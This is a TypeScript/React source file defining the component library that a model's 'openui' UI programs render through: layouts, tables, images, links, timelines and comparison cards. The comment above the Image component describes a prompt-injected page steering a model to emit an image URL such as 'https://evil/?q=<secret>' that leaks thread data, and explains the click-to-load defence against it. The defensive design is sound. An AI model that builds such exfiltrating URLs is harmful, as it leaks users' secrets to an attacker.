/* ── The openui language's component library ──
   A model that answers in `openui` writes `identifier = Component(...)` lines,
   and this is the table those names resolve against. Three rules decided it:

   — **one surface rule, held in context.** Anything framed goes through `Box`,
     and `Box` asks where it is: on the page it is the registry `Card`, inside
     another frame it is a recessed well (`INSET`), inside a `StatRow` it is a
     bare cell. So a Table in a Card is never a second bordered card inside the
     first — the bargain `settings/primitives.tsx` makes with its own `INSET` —
     and no component picks its own ground;
   — **one type scale**: `TITLE` for a thing's name, `BODY` for its text,
     `META` for what qualifies it, `LABEL` for a column or a metric's
     name. Every inset is `PAD` or `PAD_ROW`. A component that wants a new size is
     a component that has stopped matching the rest;
   — the schemas stay flat and shallow, which is what the language asks of its
     libraries: every component is a container of strings or a small record, and
     composition is `z.array(Component.ref)`. A deeply nested prop burns tokens
     and is where generation goes wrong.

   `Notice` and `Empty` are still the app's two message boxes, and the
   `--chart-*` tokens colour every chart, so a generated view follows the
   reader's palette. Every text node is `min-w-0` + `break-words`: the panel's
   width is the one thing the model cannot control.

   Nothing here reaches the network or the app's state. The fence's caller does
   not pass a `toolProvider`, so a `Query(...)` in a generated program has no
   tool to find and is dropped by the parser — the model composes a *view* over
   what it already knows, and every tool call the thread makes stays a normal
   ACP call. `toolCalls` is off in the prompt for that reason
   (`scripts/gen-openui.mjs`).

   The interactive components (`components/interactive.tsx`) are the one place
   the view talks back, and what they say is a sentence into the reader's
   composer — never an action of their own. */
import { z } from "zod/v4"
import { lazy, Suspense, useCallback, useEffect, useId, useMemo, useRef, useState } from "react"
import { ArrowUpRight, Check, ChevronDown, ChevronRight, Image as ImageIcon, Maximize2, MapPin, Minus, Navigation, Plus, Star, X } from "lucide-react"
import {
  Area,
  AreaChart,
  Bar,
  BarChart,
  CartesianGrid,
  Cell,
  Line,
  LineChart,
  Pie,
  PieChart,
  PolarAngleAxis,
  PolarGrid,
  Radar,
  RadarChart,
  XAxis,
  YAxis,
} from "recharts"
import { createLibrary, defineComponent } from "@openuidev/react-lang"
import { Empty } from "@/components/empty"
import { Accordion as UiAccordion, AccordionContent, AccordionItem, AccordionTrigger } from "@/components/ui/accordion"
import { Avatar, AvatarFallback } from "@/components/ui/avatar"
import { Badge } from "@/components/ui/badge"
import { Button as UiButton, buttonVariants } from "@/components/ui/button"
import { Carousel, CarouselContent, CarouselItem, CarouselNext, CarouselPrevious } from "@/components/ui/carousel"
import { DiffView } from "@/components/ui/diff-view"
import { Dialog, DialogContent, DialogTitle, DialogTrigger } from "@/components/ui/dialog"
import { VIEWER } from "@/components/ui/responsive-dialog"
import { Skeleton } from "@/components/ui/skeleton"
import { Item, ItemActions, ItemContent, ItemDescription, ItemMedia, ItemTitle } from "@/components/ui/item"
import { Kbd, KbdGroup } from "@/components/ui/kbd"
import { Progress as UiProgress, ProgressLabel, ProgressValue } from "@/components/ui/progress"
import { Separator } from "@/components/ui/separator"
import { Table as UiTable, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
import { Tabs as UiTabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Notice } from "@/components/notice"
import { TodoChecklist } from "@/components/todo-checklist"
import { InteractiveFlowchart } from "@/lib/openui/interactive-flowchart"
import { usePlacePhoto, type PlacePhoto } from "@/lib/openui/place-photo"
import { ChartContainer, ChartLegend, ChartLegendContent, ChartTooltip, ChartTooltipContent } from "@/components/ui/chart"
import { cn } from "@/lib/utils"
import { dominantTextDir } from "@/lib/text-direction"
import { BODY, Box, BoxHeader, chartColor, FLOW, LABEL, META, PAD, PAD_ROW, SurfaceContext, TITLE, TONE_BAR, TONE_DOT, ToneChip, WELL_PAD } from "@/lib/openui/kit"
import { UI_GROUPS } from "@/lib/openui/groups"
import { FileTree } from "@/lib/openui/components/FileTree"
import { Button, Checkbox, Form, FormControl, Input, Select, SelectItem, Slider, Textarea } from "@/lib/openui/components/interactive"
import { Quadrant } from "@/lib/openui/components/Quadrant"
import { Quote } from "@/lib/openui/components/Quote"
import { LinkAnchor, linkTarget, plainText, RichText, MarkdownBlock as RenderMarkdownBlock } from "@/lib/openui/rich-text"
import { Sequence } from "@/lib/openui/components/Sequence"
import { Steps } from "@/lib/openui/components/Steps"
import { Terminal } from "@/lib/openui/components/Terminal"
import { Bars } from "@/lib/openui/components/Bars"
import { ChangeSet } from "@/lib/openui/components/ChangeSet"
import { Checks } from "@/lib/openui/components/Checks"
import { Findings } from "@/lib/openui/components/Findings"
import { Matrix } from "@/lib/openui/components/Matrix"
import { Verdict } from "@/lib/openui/components/Verdict"

/* ── The system ── (lives in kit.tsx) */

/* ── Layout ── */

/** `root` is the container the prompt insists on wrapping every program in:
    vertical by default, a wrapping grid for a cluster of cards. The panel's
    width decides the columns, never the window's. */
const Stack = defineComponent({
  name: "Stack",
  description: "Vertical container. The root element every OpenUI program starts from.",
  props: z.object({
    children: z.array(z.any()),
    direction: z.enum(["column", "row"]).optional(),
    gap: z.enum(["sm", "md", "lg"]).optional(),
  }),
  component: ({ props, renderNode }) => (
    <div
      className={cn(
        "w-full min-w-0",
        props.direction === "row"
          ? "grid grid-cols-1 items-start gap-3 @panel-sm:grid-cols-[repeat(auto-fit,minmax(min(100%,15rem),1fr))] @panel-sm:gap-4"
          : FLOW,
        props.gap === "sm" && "gap-2 @panel-sm:gap-2",
        props.gap === "lg" && "gap-6 @panel-sm:gap-6"
      )}
    >
      {renderNode(props.children)}
    </div>
  ),
})

/** A titled frame: the header is a band of its own, the body the one flow. */
const Card = defineComponent({
  name: "Card",
  description: "A titled panel holding a group of sections.",
  props: z.object({
    title: z.string(),
    subtitle: z.string().optional(),
    children: z.array(z.any()),
  }),
  component: ({ props, renderNode }) => (
    <Box>
      <BoxHeader title={props.title} meta={props.subtitle} />
      <div className={cn(FLOW, WELL_PAD)}>{renderNode(props.children)}</div>
    </Box>
  ),
})

/* A heading and a line under it. Plain characters rather than the app's
   markdown renderer: that lives in `tool-parts.tsx`, which is what this library
   is reached *from*, and importing `Prose` here would close that cycle. */
const Section = defineComponent({
  name: "Section",
  description: "A heading with an optional line of explanatory text.",
  props: z.object({
    title: z.string(),
    text: z.string().optional(),
  }),
  component: ({ props }) => (
    <div className="w-full min-w-0 space-y-1 pt-0.5">
      <h3 className="font-heading text-base leading-snug font-medium break-words text-balance text-foreground">
        <RichText text={props.title} />
      </h3>
      {props.text && (
        <p className="text-sm leading-relaxed break-words text-pretty text-muted-foreground">
          <RichText text={props.text} />
        </p>
      )}
    </div>
  ),
})

/** A divider, for a generated dashboard that wants one. */
const Divider = defineComponent({
  name: "Divider",
  description: "A horizontal rule.",
  props: z.object({}),
  component: () => <Separator />,
})

/** A folded section: native `<details>`, so it needs no state and survives the
    streaming re-render. */
const Details = defineComponent({
  name: "Details",
  description: "A collapsible section, closed unless `open` is true.",
  props: z.object({
    summary: z.string(),
    children: z.array(z.any()),
    open: z.boolean().optional(),
  }),
  component: ({ props, renderNode }) => (
    <Box>
      <details open={props.open} className="group/details">
        <summary
          className={cn(
            "flex cursor-pointer list-none items-center gap-2 text-sm font-medium select-none hover:bg-muted [&::-webkit-details-marker]:hidden",
            PAD
          )}
        >
          <ChevronRight className="size-4 shrink-0 text-muted-foreground transition-transform group-open/details:rotate-90" />
          <span className="min-w-0 break-words">{props.summary}</span>
        </summary>
        <div className={cn(FLOW, "border-t", WELL_PAD)}>{renderNode(props.children)}</div>
      </details>
    </Box>
  ),
})

/** Tabs: alternatives the reader flips between. The `line` variant, so the
    strip reads as a heading over the panel rather than as a pill of its own. */
const Tabs = defineComponent({
  name: "Tabs",
  description: "Switchable panels: each tab has a label and its own children.",
  props: z.object({
    tabs: z.array(z.object({ label: z.string(), children: z.array(z.any()) })),
  }),
  component: ({ props, renderNode }) => (
    <UiTabs defaultValue={0} className="w-full min-w-0 gap-4">
      {/* Scrolls sideways rather than wrapping; `scrollbar-none` keeps a
          classic scrollbar from eating the fixed-height strip's content box,
          which clipped every label against it. */}
      <TabsList
        variant="line"
        className="w-full max-w-full min-w-0 justify-start overflow-x-auto border-b scrollbar-none"
      >
        {props.tabs.map((tab, index) => (
          <TabsTrigger key={index} value={index} className="min-w-0 flex-none">
            {tab.label}
          </TabsTrigger>
        ))}
      </TabsList>
      {props.tabs.map((tab, index) => (
        <TabsContent key={index} value={index} className={FLOW}>
          {renderNode(tab.children)}
        </TabsContent>
      ))}
    </UiTabs>
  ),
})

/** An FAQ-shaped fold: one frame, a hairline between questions. */
const Accordion = defineComponent({
  name: "Accordion",
  description: "A list of collapsible items, each a title over its own children. Good for FAQs.",
  props: z.object({
    items: z.array(z.object({ title: z.string(), children: z.array(z.any()) })),
  }),
  component: ({ props, renderNode }) => (
    <Box>
      {/* The frame is the Box's, so the registry accordion's own border goes. */}
      <UiAccordion className="w-full min-w-0 rounded-none border-0">
        {props.items.map((item, index) => (
          <AccordionItem key={index} value={index}>
            <AccordionTrigger className="min-w-0">
              <span className="min-w-0 break-words">{item.title}</span>
            </AccordionTrigger>
            <AccordionContent>
              <div className={FLOW}>{renderNode(item.children)}</div>
            </AccordionContent>
          </AccordionItem>
        ))}
      </UiAccordion>
    </Box>
  ),
})

/* ── Content ── */

/** Short lines. Numbered items wear a counter chip, bullets a dot centred on
    the first line — both in the same 20px column, so a list is aligned
    whichever it is. */
const List = defineComponent({
  name: "List",
  description: "Short lines, numbered or bulleted.",
  props: z.object({
    items: z.array(z.string()),
    numbered: z.boolean().optional(),
  }),
  component: ({ props }) => {
    const Tag = props.numbered ? "ol" : "ul"
    return (
      <Tag className="w-full min-w-0 space-y-1.5">
        {props.items.map((item, index) => (
          <li key={index} className="flex min-w-0 gap-2.5">
            <span className="flex h-[1.625em] w-5 shrink-0 items-center justify-center text-sm">
              {props.numbered ? (
                <span className="flex size-5 items-center justify-center rounded-md bg-muted text-[0.625rem] font-medium tabular-nums text-muted-foreground">
                  {index + 1}
                </span>
              ) : (
                <span className="size-1.5 rounded-full bg-muted-foreground" />
              )}
            </span>
            <span className={cn(BODY, "min-w-0 flex-1")}>
              <RichText text={item} />
            </span>
          </li>
        ))}
      </Tag>
    )
  },
})

/** A cell is a number when it reads as one — a figure, a currency, a percent,
    a short unit. A column whose every filled cell is one aligns to the end. */
const NUMERIC = /^[-+~]?[$€£¥]?\s?\d[\d,.]*\s?(%|[a-zA-Z]{1,3})?$/
function numericColumns(columns: string[], rows: string[][]) {
  return columns.map((_, c) => {
    const cells = rows.map((row) => row[c]?.trim() ?? "").filter(Boolean)
    // Read through the marks: `**22**` is a figure in bold, not a string.
    return cells.length > 0 && cells.every((cell) => NUMERIC.test(plainText(cell)))
  })
}

/**
 * A table. Plain string margins rather than a row-of-cells schema: a model that
 * has to declare a column set *and* keep its rows in that order gets the pairing
 * wrong far more often than it gets one array of strings wrong.
 *
 * Two shapes, one data, and three columns is the line between them: past
 * `@panel-sm` it is always the grid, and below it a row of three or more is a
 * block — the first column is the block's name and every other column is a named
 * fact under it. A five-column table squeezed into a phone panel was a sideways
 * scroller that showed two columns and hid the rest; a list shows all of them at
 * the width it has. Two columns fit at any width, so they stay a table. Only one
 * shape is ever drawn (`display:none`, never merely off-screen), so a screen
 * reader hears the data once.
 *
 * `tone`: `muted` greys the cells; otherwise the first column is the row's name
 * and wears it.
 */
const Table = defineComponent({
  name: "Table",
  description: "A grid of text cells. `columns` names the headings and each entry of `rows` is one row.",
  props: z.object({
    columns: z.array(z.string()),
    rows: z.array(z.array(z.string())),
    header: z.boolean().optional(),
    tone: z.enum(["default", "muted", "accent"]).optional(),
  }),
  component: ({ props }) => {
    const numeric = numericColumns(props.columns, props.rows)
    const muted = props.tone === "muted"
    // Two columns (a name and its value) still fit a phone panel, and stacking
    // them would put a column label above every row for nothing.
    const stacked = props.columns.length > 2
    return (
      <Box>
        {/* Narrow: one block per row. The name is the block's head, and a column
            with nothing in that row is left out rather than drawn as a label
            with a blank beside it. */}
        {stacked && (
          <ul className="w-full min-w-0 list-none divide-y @panel-sm:hidden">
            {props.rows.map((row, rowIndex) => {
              const facts = props.columns
                .map((column, index) => ({ column, value: (row[index] ?? "").trim(), index }))
                .slice(1)
                .filter((fact) => fact.value !== "")
              return (
                <li key={rowIndex} className={cn("min-w-0 space-y-1", PAD_ROW)}>
                  <p
                    className={cn(
                      "min-w-0 text-sm leading-snug font-medium",
                      muted ? "text-muted-foreground" : "text-foreground"
                    )}
                  >
                    {(row[0] ?? "").trim() ? <RichText text={(row[0] ?? "").trim()} /> : "—"}
                  </p>
                  {facts.length > 0 && (
                    <dl className="min-w-0 space-y-0.5">
                      {facts.map((fact) => (
                        <div key={fact.index} className="flex min-w-0 flex-wrap items-baseline justify-between gap-x-3">
                          <dt className={cn(LABEL, "min-w-0")}>{fact.column}</dt>
                          <dd
                            className={cn(
                              "ms-auto min-w-0 text-end text-sm break-words",
                              muted ? "text-muted-foreground" : "text-foreground",
                              numeric[fact.index] && "tabular-nums"
                            )}
                          >
                            <RichText text={fact.value} />
                          </dd>
                        </div>
                      ))}
                    </dl>
                  )}
                </li>
              )
            })}
          </ul>
        )}
        {/* Wide: the registry table, whose own container scrolls, so a table
            still wider than the panel scrolls inside the turn rather than widening it. */}
        <div className={cn("w-full min-w-0", stacked && "hidden @panel-sm:block")}>
          <UiTable>
            {props.header !== false && (
              <TableHeader>
                <TableRow className="hover:bg-transparent">
                  {props.columns.map((column, index) => (
                    <TableHead key={index} className={cn("h-10 px-4 whitespace-normal text-muted-foreground", numeric[index] ? "text-end" : "text-start")}>
                      {column}
                    </TableHead>
                  ))}
                </TableRow>
              </TableHeader>
            )}
            <TableBody>
              {props.rows.map((row, rowIndex) => (
                <TableRow key={rowIndex}>
                  {props.columns.map((_, cellIndex) => (
                    <TableCell
                      key={cellIndex}
                      className={cn(
                        "min-w-24 px-4 align-top break-words whitespace-normal",
                        numeric[cellIndex] && "min-w-0 text-end whitespace-nowrap tabular-nums",
                        muted && "text-muted-foreground",
                        cellIndex === 0 && !muted && "font-medium"
                      )}
                    >
                      <RichText text={row[cellIndex] ?? ""} />
                    </TableCell>
                  ))}
                </TableRow>
              ))}
            </TableBody>
          </UiTable>
        </div>
      </Box>
    )
  },
})

/**
 * A callout. `Notice` is the app's one alert box and its four tones are
 * semantic there, so this passes the tone through rather than painting its own.
 */
const Callout = defineComponent({
  name: "Callout",
  description: "A boxed aside: info, warn, error or neutral, with an optional title.",
  props: z.object({
    text: z.string(),
    tone: z.enum(["neutral", "info", "warn", "error"]).optional(),
    title: z.string().optional(),
  }),
  component: ({ props }) => (
    <Notice
      className="w-full min-w-0 [&_p]:break-words [&_button]:max-w-full [&_button]:whitespace-normal [&_button]:break-words"
      tone={props.tone ?? "neutral"}
      size="sm"
      title={props.title}
    >
      <span className="break-words">
        <RichText text={props.text} />
      </span>
    </Notice>
  ),
})

/** Preformatted text. The language, when named, is the frame's label band — a
    reference, not a highlighted pane. Wraps rather than scrolling, because a
    long token in a phone panel would push the whole answer sideways. */
const Code = defineComponent({
  name: "Code",
  description: "Preformatted text, a snippet or a log.",
  props: z.object({
    text: z.string(),
    language: z.string().optional(),
  }),
  component: ({ props }) => (
    <Box>
      {props.language && (
        <div className={cn("border-b bg-muted/50 px-3 py-1.5 @panel-sm:px-4", LABEL)}>{props.language}</div>
      )}
      <pre
        className={cn(
          "overflow-auto font-mono text-xs leading-relaxed break-words whitespace-pre-wrap text-foreground",
          PAD
        )}
      >
        {props.text}
      </pre>
    </Box>
  ),
})

/** A definition list, set like a receipt: the name at the start, the value at
    the end, and a value too long for the line wraps under its name on its own —
    no breakpoint, the flex-wrap is the reflow. */
const KeyValue = defineComponent({
  name: "KeyValue",
  description: "A list of named facts.",
  props: z.object({
    items: z.array(z.object({ key: z.string(), value: z.string() })),
  }),
  component: ({ props }) => (
    <Box>
      <dl className="w-full divide-y">
        {props.items.map((item, index) => (
          <div
            key={index}
            className={cn("flex min-w-0 flex-wrap items-baseline justify-between gap-x-4 gap-y-0.5", PAD_ROW)}
          >
            <dt className="min-w-0 text-sm break-words text-muted-foreground">{item.key}</dt>
            <dd className="ms-auto min-w-0 text-end text-sm font-medium break-words text-foreground tabular-nums">
              <RichText text={item.value} />
            </dd>
          </div>
        ))}
      </dl>
    </Box>
  ),
})

/** An absence, drawn as one: the app's dashed box, never an alert. */
const EmptyState = defineComponent({
  name: "EmptyState",
  description: "A box saying there is nothing to show.",
  props: z.object({
    text: z.string(),
  }),
  component: ({ props }) => (
    <Empty className="w-full min-w-0 [&_p]:break-words" size="sm">
      {props.text}
    </Empty>
  ),
})

/**
 * An image. Remote images are the one thing in this library that would reach
 * the network, and a URL the model writes can carry whatever the thread has read
 * (a prompt-injected page asking for `https://evil/?q=<secret>`). So a `data:`
 * image draws at once and an `http(s)` one waits behind a click that names its
 * host — the reader's consent is the fetch. Anything else is not drawn.
 */
const Image = defineComponent({
  name: "Image",
  description: "An image from an https or data: URL, with alt text and an optional caption.",
  props: z.object({
    src: z.string(),
    alt: z.string(),
    caption: z.string().optional(),
  }),
  component: ({ props }) => <GeneratedImage {...props} />,
})

/** What an `src` is: a `data:` image (drawn at once) or an http(s) host (drawn on a click). */
function imageSource(src: string) {
  const inline = /^data:image\/(png|jpe?g|gif|webp);/i.test(src)
  let host: string | null = null
  try {
    const url = new URL(src)
    if (url.protocol === "https:" || url.protocol === "http:") host = url.host
  } catch {
    /* not a URL — drawn as the alt text below */
  }
  return { inline, host }
}

function GeneratedImage({ src, alt, caption }: { src: string; alt: string; caption?: string }) {
  const { inline, host } = imageSource(src)
  const [shown, setShown] = useState(inline)
  const [failed, setFailed] = useState(false)
  if (failed || (!shown && !host)) {
    return <Empty size="sm">{failed ? `Image failed to load: ${alt}` : alt}</Empty>
  }
  return (
    <Box>
      <figure className="min-w-0">
        {shown ? (
          <img
            src={src}
            alt={alt}
            referrerPolicy="no-referrer"
            onError={() => setFailed(true)}
            className="mx-auto block max-h-96 max-w-full object-contain"
          />
        ) : (
          <button
            type="button"
            onClick={() => setShown(true)}
            className={cn("flex w-full flex-col items-start gap-0.5 text-start outline-none hover:bg-muted focus-visible:ring-[3px] focus-visible:ring-ring/50 focus-visible:ring-inset", PAD)}
          >
            <span className={cn(BODY, "[overflow-wrap:anywhere]")}>{alt}</span>
            <span className={cn(META, "[overflow-wrap:anywhere]")}>Load image from {host}</span>
          </button>
        )}
        {caption && (
          <figcaption className={cn(META, "border-t text-pretty", PAD_ROW)}>{caption}</figcaption>
        )}
      </figure>
    </Box>
  )
}

/** Short tags. */
const Badges = defineComponent({
  name: "Badges",
  description: "A row of short tags, each with an optional tone.",
  props: z.object({
    items: z.array(
      z.object({
        text: z.string(),
        tone: z.enum(["neutral", "info", "success", "warn", "error"]).optional(),
      })
    ),
  }),
  component: ({ props }) => (
    <div className="flex w-full min-w-0 flex-wrap gap-1.5">
      {props.items.map((item, index) => (
        <ToneChip key={index} text={item.text} tone={item.tone} />
      ))}
    </div>
  ),
})

/* ── Markdown ── */
const Markdown = defineComponent({
  name: "Markdown",
  description: "A block of Markdown: headings, lists, tables, quotes, links and fenced code.",
  props: z.object({ text: z.string() }),
  component: ({ props }) => <RenderMarkdownBlock text={props.text} />,
})

/* ── Links ──
   `linkTarget` and `LinkAnchor` (the address allowlist and the one anchor)
   live in `rich-text.tsx` with the inline markdown that can also draw a link,
   so a `Rows` href and a `[words](https://…)` in a table cell are the same
   rule twice, not two rules. */

/** One link: its words, then the host that says where a click goes. */
const Link = defineComponent({
  name: "Link",
  description: "One link: the words to read and the address they open.",
  props: z.object({
    label: z.string(),
    href: z.string(),
  }),
  component: ({ props }) => {
    const url = linkTarget(props.href)
    // The host is the consent line, and only worth saying when the words do not
    // already carry it. An address that is not a link is still shown, as text.
    const address = (url && !props.label.includes(url.host) ? url.host : null) ?? (url ? null : props.href)
    return (
      <p className={cn(BODY, "min-w-0")}>
        {url ? <LinkAnchor url={url}>{props.label}</LinkAnchor> : props.label}
        {address && <span className={cn(META, "ms-2 break-all")}>{address}</span>}
      </p>
    )
  },
})

/** A row of a divided list, at the page's own margin. A list is not a frame:
    inside a `Card` its rows sit on the card's ground under the card's one
    inset, and beside prose its lines reach the margin the words do. Wrapping
    either list in `Box` put a recessed well with its own padding inside the
    card — two insets for one list, and the dividers stopping short of both. */
const LIST_ROW = "flex w-full min-w-0 items-start gap-3 py-2.5 first:pt-0 last:pb-0 @panel-sm:py-3"

/** Several links: a hairline between them, the facts beside the words. */
const Links = defineComponent({
  name: "Links",
  description: "A list of links, each with an optional line of facts: references, tickets, pages.",
  props: z.object({
    items: z.array(z.object({ label: z.string(), href: z.string(), meta: z.string().optional() })),
  }),
  component: ({ props }) => (
    <div className="w-full divide-y">
      {props.items.map((item, index) => {
        const url = linkTarget(item.href)
        const line = [item.meta, url?.host ?? item.href].filter(Boolean).join(" · ")
        const body = (
          <>
            <span className="min-w-0 flex-1 space-y-0.5">
              <span
                className={cn(
                  "block min-w-0 text-sm leading-snug font-medium break-words",
                  url ? "text-primary" : "text-foreground"
                )}
              >
                {item.label}
              </span>
              <span className={cn(META, "block truncate")} title={item.href}>
                {line}
              </span>
            </span>
            {url && <ArrowUpRight className="mt-0.5 size-4 shrink-0 text-muted-foreground" />}
          </>
        )
        return url ? (
          <a
            key={index}
            href={url.href}
            target="_blank"
            rel="noreferrer noopener"
            title={url.href}
            className={cn(LIST_ROW, "hover:bg-muted")}
          >
            {body}
          </a>
        ) : (
          <div key={index} className={LIST_ROW}>
            {body}
          </div>
        )
      })}
    </div>
  ),
})

/**
 * A triage list. One row is a thing that needs something done about it — an
 * issue, a ticket, a PR, a follow-up, a source — so its name comes first, its
 * state is a chip, and what qualifies it, what it says and where it lives
 * follow. A `Table` is the right shape when every row is one line of a few
 * cells; this is the shape a row takes when two of the cells are paragraphs,
 * which is what a five-column table of triage turned out to be.
 */
const Rows = defineComponent({
  name: "Rows",
  description: "A triage list: each row a name, an optional state chip, a line of facts, a detail and a link out.",
  props: z.object({
    items: z.array(
      z.object({
        title: z.string(),
        status: z.string().optional(),
        tone: z.enum(["neutral", "info", "success", "warn", "error"]).optional(),
        meta: z.string().optional(),
        text: z.string().optional(),
        href: z.string().optional(),
      })
    ),
  }),
  component: ({ props }) => (
    <div className="w-full divide-y">
      {props.items.map((item, index) => {
        const url = linkTarget(item.href)
        const facts = [item.meta, url?.host].filter(Boolean).join(" · ")
        return (
          <div key={index} className="min-w-0 space-y-1 py-2.5 first:pt-0 last:pb-0 @panel-sm:py-3">
            {/* The name starts every row at the same margin and the state sits
                at the end of it: a chip in front sized each title differently
                (`urgent` is wider than `high`), so a column of rows read as a
                ragged column of headings. */}
            <div className="flex min-w-0 items-start justify-between gap-x-3">
              {url ? (
                <LinkAnchor
                  url={url}
                  underline={false}
                  className="flex min-w-0 items-start gap-1 text-sm leading-snug underline-offset-2 hover:underline"
                >
                  <span dir={dominantTextDir(item.title)} className="min-w-0 break-words text-start">{item.title}</span>
                  <ArrowUpRight className="mt-0.5 size-3.5 shrink-0" />
                </LinkAnchor>
              ) : (
                <span dir={dominantTextDir(item.title)} className="min-w-0 text-start text-sm leading-snug font-medium break-words text-foreground">
                  <RichText text={item.title} />
                </span>
              )}
              {item.status && (
                <span className="shrink-0">
                  <ToneChip text={item.status} tone={item.tone} />
                </span>
              )}
            </div>
            {facts && (
              <p dir={dominantTextDir(facts)} className={cn(META, "text-start text-pretty")}>
                <RichText text={facts} />
              </p>
            )}
            {item.text && (
              <p dir={dominantTextDir(item.text)} className={cn(BODY, "text-start text-pretty")}>
                <RichText text={item.text} />
              </p>
            )}
          </div>
        )
      })}
    </div>
  ),
})

/** Ordered events with a state each. The rail is the list; the marker says the
    state by shape as well as by colour. */
const Timeline = defineComponent({
  name: "Timeline",
  description: "Ordered steps or events: a title, optional time and text, and a status.",
  props: z.object({
    items: z.array(
      z.object({
        title: z.string(),
        time: z.string().optional(),
        text: z.string().optional(),
        status: z.enum(["done", "active", "pending", "failed"]).optional(),
      })
    ),
  }),
  component: ({ props }) => (
    <ol className="w-full min-w-0">
      {props.items.map((item, index) => {
        const status = item.status ?? "pending"
        return (
          <li key={index} className="relative flex min-w-0 gap-3 pb-4 last:pb-0">
            {index < props.items.length - 1 && (
              <span className="absolute top-6 bottom-1 left-2.5 w-px -translate-x-1/2 bg-border" />
            )}
            <span
              className={cn(
                "mt-px flex size-5 shrink-0 items-center justify-center rounded-full",
                status === "done" && "bg-primary text-primary-foreground",
                status === "active" && "bg-primary/10 ring-1 ring-primary ring-inset",
                status === "failed" && "bg-destructive/10 text-destructive ring-1 ring-destructive ring-inset",
                status === "pending" && "bg-background ring-1 ring-border ring-inset"
              )}
            >
              {status === "done" && <Check className="size-3" strokeWidth={3} />}
              {status === "failed" && <X className="size-3" strokeWidth={3} />}
              {status === "active" && <span className="size-2 animate-pulse rounded-full bg-primary" />}
            </span>
            <div className="min-w-0 flex-1 space-y-0.5 pt-px">
              <div className="flex min-w-0 flex-wrap items-baseline justify-between gap-x-3">
                <span
                  className={cn("min-w-0 text-sm leading-snug font-medium break-words", status === "pending" && "text-muted-foreground")}
                >
                  <RichText text={item.title} />
                </span>
                {item.time && <span className={cn(META, "max-w-full tabular-nums")}>{item.time}</span>}
              </div>
              {item.text && (
                <p className={cn(META, "text-pretty")}>
                  <RichText text={item.text} />
                </p>
              )}
            </div>
          </li>
        )
      })}
    </ol>
  ),
})

/** Options side by side: one frame each, name and verdict as its header band,
    pros and cons marked by glyph as well as by colour. Stacks below `@panel-sm`. */
const Compare = defineComponent({
  name: "Compare",
  description: "Options side by side, each with a name, optional verdict, pros and cons.",
  props: z.object({
    options: z.array(
      z.object({
        name: z.string(),
        verdict: z.string().optional(),
        pros: z.array(z.string()).optional(),
        cons: z.array(z.string()).optional(),
      })
    ),
  }),
  component: ({ props }) => (
    <div className="grid w-full min-w-0 gap-3 @panel-sm:grid-cols-[repeat(auto-fit,minmax(min(100%,13rem),1fr))] @panel-sm:gap-4">
      {props.options.map((option, index) => (
        <Box key={index}>
          <BoxHeader title={option.name} meta={option.verdict} />
          <ul className={cn("min-w-0 space-y-1.5", PAD)}>
            {option.pros?.map((pro, i) => (
              <li key={`p${i}`} className="flex min-w-0 gap-2">
                <Plus className="mt-[0.3em] size-3.5 shrink-0 text-success" strokeWidth={2.5} />
                <span className={cn(BODY, "min-w-0")}>
                  <RichText text={pro} />
                </span>
              </li>
            ))}
            {option.cons?.map((con, i) => (
              <li key={`c${i}`} className="flex min-w-0 gap-2">
                <Minus className="mt-[0.3em] size-3.5 shrink-0 text-destructive" strokeWidth={2.5} />
                <span className={cn(BODY, "min-w-0")}>
                  <RichText text={con} />
                </span>
              </li>
            ))}
          </ul>
        </Box>
      ))}
    </div>
  ),
})

/** A before/after of text, drawn by the same line diff tool steps use. */
const Diff = defineComponent({
  name: "Diff",
  description: "A line diff between old and new text, with an optional path.",
  props: z.object({
    before: z.string(),
    after: z.string(),
    path: z.string().optional(),
  }),
  component: ({ props }) => <DiffView className="w-full" oldText={props.before} newText={props.after} path={props.path} />,
})

/** Keyboard chords: the action at the start, the keycaps at the end. */
const Keys = defineComponent({
  name: "Keys",
  description: "Keyboard shortcuts: each entry is a list of keys and what the chord does.",
  props: z.object({
    items: z.array(z.object({ keys: z.array(z.string()), action: z.string() })),
  }),
  component: ({ props }) => (
    <Box>
      <div className="w-full divide-y">
        {props.items.map((item, index) => (
          <div
            key={index}
            className={cn("flex min-w-0 flex-wrap items-center justify-between gap-x-4 gap-y-1", PAD_ROW)}
          >
            <span className={cn(BODY, "min-w-0 flex-1 basis-40")}>{item.action}</span>
            <KbdGroup className="ms-auto min-w-0 max-w-full flex-wrap">
              {item.keys.map((key, i) => (
                <Kbd key={i}>{key}</Kbd>
              ))}
            </KbdGroup>
          </div>
        ))}
      </div>
    </Box>
  ),
})

/** People: initials avatars, never a fetched picture (see `Image` for why),
    in a grid of equal cells so the names line up in columns. */
const People = defineComponent({
  name: "People",
  description: "A list of people with a name and optional role, drawn as initials avatars.",
  props: z.object({
    items: z.array(z.object({ name: z.string(), role: z.string().optional() })),
  }),
  component: ({ props }) => (
    <div className="grid w-full min-w-0 grid-cols-[repeat(auto-fill,minmax(min(100%,11rem),1fr))] gap-x-4 gap-y-3">
      {props.items.map((person, index) => (
        <div key={index} className="flex min-w-0 items-center gap-2.5">
          <Avatar>
            <AvatarFallback className="text-xs">
              {person.name
                .split(/\s+/)
                .slice(0, 2)
                .map((word) => word[0]?.toUpperCase() ?? "")
                .join("")}
            </AvatarFallback>
          </Avatar>
          <div className="min-w-0 leading-tight">
            <p className="truncate text-sm font-medium text-foreground">{person.name}</p>
            {person.role && <p className={cn(META, "truncate")}>{person.role}</p>}
          </div>
        </div>
      ))}
    </div>
  ),
})

/** Several images, one at a time. Each slide is an `Image`, so the click-to-load
    rule holds; the arrows sit inside the frame, which a transcript column has
    room for and shadcn's `-left-12` does not. */
const Gallery = defineComponent({
  name: "Gallery",
  description: "A carousel of images, each with src, alt and optional caption.",
  props: z.object({
    images: z.array(z.object({ src: z.string(), alt: z.string(), caption: z.string().optional() })),
  }),
  component: ({ props }) => (
    <Carousel className="w-full min-w-0">
      <CarouselContent>
        {props.images.map((image, index) => (
          <CarouselItem key={index}>
            <GeneratedImage {...image} />
          </CarouselItem>
        ))}
      </CarouselContent>
      {props.images.length > 1 && (
        <>
          <CarouselPrevious className="left-2" />
          <CarouselNext className="right-2" />
        </>
      )}
    </Carousel>
  ),
})

/** Places, products, options. A card is a banner (the photo, else a colour wash with
    the name's initial), a number, a meta chip, text and tags. A photo keeps
    `Image`'s rule: a remote one loads on a click naming its host. A card with
    coordinates has a "Show on map" button, and the map is ONE panel under the whole
    grid, never inside a card - picking another card re-points it, and it is not
    mounted (a billed load) until the first pick. */
